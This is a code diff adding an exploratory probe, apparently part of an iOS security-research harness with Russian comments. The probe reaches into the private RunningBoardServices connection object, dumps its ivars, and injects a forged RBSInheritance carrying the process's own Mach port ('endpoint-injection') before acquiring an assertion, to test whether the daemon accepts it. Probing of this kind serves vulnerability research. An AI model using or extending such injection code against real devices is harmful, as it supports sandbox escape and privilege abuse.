@@ -41538,6 +41538,254 @@ static void p_bq75(void) {
     LOG("[bq75] фоновый запуск...");
 }
 
+// p_bq76 — v226: RBClientInheritanceManager — зонд через ЖИВОЙ
+// RBSConnection. Менеджер не резолвится по имени (0x0, §221) —
+// но os-лог показывает его внутри assertion-транзиентов. Путь:
+// 1) sharedInstance → все ivar'ы (class_copyIvarList)
+// 2) в каждом ivar — класс (ищем *Inheritance*)
+// 3) если найден: setInheritances: с нашим RBSInheritance (§221)
+// 4) затем acquire — демон увидит наследование в context
+static void bq76_dump_ivars(id obj, const char *label) {
+    if (!obj) return;
+    Class cls = [obj class];
+    unsigned int ic = 0;
+    Ivar *ivs = class_copyIvarList(cls, &ic);
+    LOG("[bq76] %s: класс=%s ivarCount=%u", label,
+        class_getName(cls), ic);
+    for (unsigned i = 0; i < ic && i < 40; i++) {
+        const char *n = ivar_getName(ivs[i]);
+        const char *t = ivar_getTypeEncoding(ivs[i]);
+        ptrdiff_t off = ivar_getOffset(ivs[i]);
+        // читаем значение по типу (только @ — указатели)
+        char vdesc[80] = "";
+        if (t && t[0] == '@' && off > 0 && off < 0x400) {
+            @try {
+                id v = object_getIvar(obj, ivs[i]);
+                if (v) {
+                    const char *vc = class_getName([v class]);
+                    snprintf(vdesc, sizeof(vdesc), " -> %s", vc);
+                }
+            } @catch (id e) { snprintf(vdesc, sizeof(vdesc), " (EXC)"); }
+        }
+        LOG("[bq76]   ivar[%02u] %-24s off=%04zd type=%s%s", i,
+            n ?: "?", (long)off, t ?: "?", vdesc);
+    }
+    if (ivs) free(ivs);
+}
+
+static void p_bq76(void) {
+    LOG("[bq76] v226: InheritanceManager через живой RBSConnection");
+    fsync(fileno(stderr));
+    dispatch_queue_t q = dispatch_queue_create("bq76.q", DISPATCH_QUEUE_SERIAL);
+    int ctl = 0;
+    char tag[64];
+    {
+        int n = 0;
+        xpc_object_t m = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t seq[1] = { m };
+        bq51_run(q, "ctl-empty", seq, 1, 1, &n, tag, sizeof(tag));
+        if (!strcmp(tag, "invalidate")) ctl = 1;
+        LOG("[bq76] ctl-empty: nev=%d tag=%s -> control %s",
+            n, tag[0] ? tag : "-", ctl ? "OK" : "FAILED");
+    }
+    if (!ctl) { LOG("[bq76] CONTROL FAILED (§144)"); return; }
+    dlopen("/System/Library/PrivateFrameworks/RunningBoardServices"
+           ".framework/RunningBoardServices", RTLD_LAZY | RTLD_LOCAL);
+    dlopen("/System/Library/PrivateFrameworks/BoardServices"
+           ".framework/BoardServices", RTLD_LAZY | RTLD_LOCAL);
+    fsync(fileno(stderr));
+
+    dispatch_async(dispatch_get_main_queue(), ^{
+    @try {
+        Class cCls = NSClassFromString(@"RBSConnection");
+        Class iCls = NSClassFromString(@"RBSInheritance");
+        Class tCls = NSClassFromString(@"RBSTarget");
+        Class aCls = NSClassFromString(@"RBSAssertion");
+        Class laCls = NSClassFromString(@"RBSLegacyAttribute");
+        LOG("[bq76] классы: conn=%p inh=%p t=%p a=%p la=%p",
+            cCls, iCls, tCls, aCls, laCls);
+        if (!cCls || !iCls) { LOG("[bq76] нет классов"); return; }
+
+        // живой синглтон
+        typedef id (*SIFn)(Class, SEL);
+        SIFn sif = (SIFn)objc_msgSend;
+        id conn = sif(cCls, @selector(sharedInstance));
+        LOG("[bq76] sharedInstance=%p", conn);
+        if (conn) {
+            // полный ivar-дамп соединения
+            bq76_dump_ivars(conn, "RBSConnection");
+            // ищем RBClientInheritanceManager в ivar'ах
+            unsigned int ic = 0;
+            Ivar *ivs = class_copyIvarList([conn class], &ic);
+            id inhMgr = nil;
+            const char *inhMgrName = nil;
+            for (unsigned i = 0; i < ic; i++) {
+                const char *t = ivar_getTypeEncoding(ivs[i]);
+                ptrdiff_t off = ivar_getOffset(ivs[i]);
+                if (t && t[0] == '@') {
+                    @try {
+                        id v = object_getIvar(conn, ivs[i]);
+                        if (v) {
+                            const char *vc = class_getName([v class]);
+                            if (vc && strstr(vc, "Inheritance")) {
+                                inhMgr = v;
+                                inhMgrName = ivar_getName(ivs[i]);
+                                LOG("[bq76] !!! InheritanceManager "
+                                    "найден: ivar=%s класс=%s",
+                                    inhMgrName, vc);
+                            }
+                        }
+                    } @catch (id e) {}
+                }
+            }
+            if (ivs) free(ivs);
+            // v226.1: ivar[14] _inheritances = NSMutableSet — ПРЯМО
+            // в соединении! Добавляем наш RBSInheritance туда → acquire.
+            {
+                Ivar inhIvar = class_getInstanceVariable(
+                    [conn class], "_inheritances");
+                Ivar endowIvar = class_getInstanceVariable(
+                    [conn class], "_savedEndowments");
+                LOG("[bq76] _inheritances ivar=%p _savedEndowments=%p",
+                    inhIvar, endowIvar);
+                if (inhIvar) {
+                    id inhSet = object_getIvar(conn, inhIvar);
+                    LOG("[bq76] _inheritances=%s (count=%lu)",
+                        inhSet ? NSStringFromClass([inhSet class]).UTF8String : "(nil)",
+                        (unsigned long)(inhSet ? [inhSet count] : 0));
+                    // строим inheritance (§221)
+                    mach_port_t self_port = mach_task_self_;
+                    NSData *endow = [NSData dataWithBytes:&self_port length:8];
+                    SEL iiSel = NSSelectorFromString(
+                        @"_initWithNamespace:environment:encodedEndowment:"
+                        "originatingIdentifier:attributePath:");
+                    id inh = nil;
+                    if ([iCls instancesRespondToSelector:iiSel]) {
+                        typedef id (*IFn)(id, SEL, NSString *, NSString *,
+                                          NSData *, NSString *, NSString *);
+                        IFn f = (IFn)objc_msgSend;
+                        inh = f([iCls alloc], iiSel,
+                                @"com.apple.boardservices.endpoint-injection",
+                                @"(none)", endow, @"bq76", @"");
+                    }
+                    LOG("[bq76] inh=%p", inh);
+                    if (inh && inhSet && [inhSet isKindOfClass:
+                                          [NSMutableSet class]]) {
+                        [(NSMutableSet *)inhSet addObject:inh];
+                        LOG("[bq76] *** RBSInheritance ДОБАВЛЕН в "
+                            "_inheritances соединения! count=%lu ***",
+                            (unsigned long)[inhSet count]);
+                        fsync(fileno(stderr));
+                        // acquire с наследованием в соединении
+                        if (tCls && aCls && laCls) {
+                            typedef id (*CFn)(Class, SEL);
+                            CFn cf = (CFn)objc_msgSend;
+                            typedef id (*AFn)(Class, SEL,
+                                unsigned long long, unsigned long long);
+                            AFn af = (AFn)objc_msgSend;
+                            id la = af(laCls,
+                                @selector(attributeWithReason:flags:),
+                                4ull, 1ull);
+                            typedef id (*IFn)(id, SEL, NSString *, id,
+                                              NSArray *);
+                            IFn f2 = (IFn)objc_msgSend;
+                            id tgt = cf(tCls, @selector(currentProcess));
+                            id as = f2([aCls alloc],
+                                @selector(initWithExplanation:target:attributes:),
+                                @"bq76 with-inh-in-conn", tgt, @[la]);
+                            NSError *err = nil;
+                            typedef BOOL (*AFn2)(id, SEL, NSError **);
+                            AFn2 aq = (AFn2)objc_msgSend;
+                            BOOL ok = aq(as, @selector(acquireWithError:),
+                                         &err);
+                            LOG("[bq76] acquire после добавления inh "
+                                "-> %d err=%s", (int)ok,
+                                err ? err.localizedDescription.UTF8String
+                                    : "(none)");
+                            fsync(fileno(stderr));
+                            sleep(2);
+                            // убрать для чистоты
+                            [(NSMutableSet *)inhSet removeObject:inh];
+                            [as invalidate];
+                        }
+                    } else {
+                        LOG("[bq76] inh=%p set=%p — не добавлен", inh, inhSet);
+                    }
+                }
+            }
+            if (!inhMgr) {
+                LOG("[bq76] — прямое добавление выше —");
+            } else {
+                // нашли! Дамп менеджера
+                bq76_dump_ivars(inhMgr, "InheritanceManager");
+                bq57_dump([inhMgr class], "InheritanceManager");
+                // строим inheritance (§221)
+                mach_port_t self_port = mach_task_self_;
+                NSData *endow = [NSData dataWithBytes:&self_port length:8];
+                SEL iiSel = NSSelectorFromString(
+                    @"_initWithNamespace:environment:encodedEndowment:"
+                    "originatingIdentifier:attributePath:");
+                id inh = nil;
+                if ([iCls instancesRespondToSelector:iiSel]) {
+                    typedef id (*IFn)(id, SEL, NSString *, NSString *,
+                                      NSData *, NSString *, NSString *);
+                    IFn f = (IFn)objc_msgSend;
+                    inh = f([iCls alloc], iiSel,
+                            @"com.apple.boardservices.endpoint-injection",
+                            @"(none)", endow, @"bq76", @"");
+                }
+                LOG("[bq76] inh=%p", inh);
+                // setInheritances: на менеджере!
+                if (inh && inhMgr) {
+                    SEL setSel = @selector(setInheritances:);
+                    if ([inhMgr respondsToSelector:setSel]) {
+                        typedef void (*SF)(id, SEL, NSArray *);
+                        SF sf = (SF)objc_msgSend;
+                        sf(inhMgr, setSel, @[inh]);
+                        LOG("[bq76] setInheritances: OK — наследование "
+                            "в менеджере!");
+                        // acquire после установки
+                        if (tCls && aCls && laCls) {
+                            typedef id (*CFn)(Class, SEL);
+                            CFn cf = (CFn)objc_msgSend;
+                            typedef id (*AFn)(Class, SEL,
+                                unsigned long long, unsigned long long);
+                            AFn af = (AFn)objc_msgSend;
+                            id la = af(laCls,
+                                @selector(attributeWithReason:flags:),
+                                4ull, 1ull);
+                            typedef id (*IFn)(id, SEL, NSString *, id,
+                                              NSArray *);
+                            IFn f2 = (IFn)objc_msgSend;
+                            id tgt = cf(tCls, @selector(currentProcess));
+                            id as = f2([aCls alloc],
+                                @selector(initWithExplanation:target:attributes:),
+                                @"bq76 with-inheritance", tgt, @[la]);
+                            NSError *err = nil;
+                            typedef BOOL (*AFn2)(id, SEL, NSError **);
+                            AFn2 aq = (AFn2)objc_msgSend;
+                            BOOL ok = aq(as, @selector(acquireWithError:),
+                                         &err);
+                            LOG("[bq76] acquire с наследованием -> %d "
+                                "err=%s", (int)ok,
+                                err ? err.localizedDescription.UTF8String
+                                    : "(none)");
+                        }
+                    } else {
+                        LOG("[bq76] setInheritances: недоступен");
+                    }
+                }
+            }
+        }
+        LOG("[bq76] done");
+    } @catch (NSException *e) {
+        LOG("[bq76] ИСКЛ: %s — %s", e.name.UTF8String ?: "?",
+            e.reason ? e.reason.UTF8String : "?");
+    }
+    });
+    LOG("[bq76] фоновый запуск...");
+}
+
 // p_astris — v192: существует ли AppleAstrisGpioProbe в IORegistry
 // УСТРОЙСТВА из песочницы (matching без open, нулевой риск) и что
 // отдаёт IOServiceGetMatchingService. Контекст: в VM-госте IOServiceOpen
@@ -49039,6 +49287,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ73")) { p_bq73(); LOG("[probe13] bq73-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ74")) { p_bq74(); LOG("[probe13] bq74-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ75")) { p_bq75(); LOG("[probe13] bq75-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ76")) { p_bq76(); LOG("[probe13] bq76-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
